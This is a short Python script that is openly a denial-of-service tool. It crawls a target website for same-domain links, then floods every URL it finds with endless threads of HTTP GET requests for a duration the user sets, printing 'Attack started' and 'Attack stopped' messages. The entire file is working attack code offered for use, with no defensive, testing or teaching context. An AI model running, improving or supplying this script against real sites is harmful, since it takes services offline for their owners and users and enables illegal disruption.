from bs4 import BeautifulSoup
from urllib.request import urlopen
from threading import Thread
from requests import get
from time import sleep
import sys

targets = []

def worker(url):
	while True:
		Thread(target=get, args=(url,)).start()

def ddos(threads):
	for url in targets:
		for x in range(threads):
			Thread(target=worker, args=(url,)).start()


def set_target(target):
	if "http" not in target:
		print("Enter a valid url.")
		exit()
	elif not target.endswith("/"):
		pass
	else:
		return target
		

def constructor(url, target):
	if url == "#":
		pass
	elif url.startswith("/"):
		targets.append(target + url)
	elif "http" not in url:
		pass
	elif target not in url:
		pass
	else:
		targets.append(url)


def crawler(target):
	try:
		html_page = urlopen(target)
		soup = BeautifulSoup(html_page, features="html5lib")

		for link in soup.findAll('a'):
			constructor(link.get('href'), target)
	except:
		targets.append(target)





def main():
	try:
		target = sys.argv[1]
		threads = int(sys.argv[2])
		time = int(sys.argv[3])

		crawler(target)
		for target in targets:
			print(f"Attack started to {target}")

		t = Thread(target=ddos, args=(threads,))
		t.daemon = True
		t.start()
		sleep(int(time))
		print("Attack stopped.")
		exit()


	except ValueError:
		print(f"Usage: python <{sys.argv[0]}> <target> <threads> <attack time>")

	except IndexError:
		print(f"Usage: python <{sys.argv[0]}> <target> <threads> <attack time>")

	except TimeoutError:
		print("Target is down.")












if __name__ == '__main__':
	main()
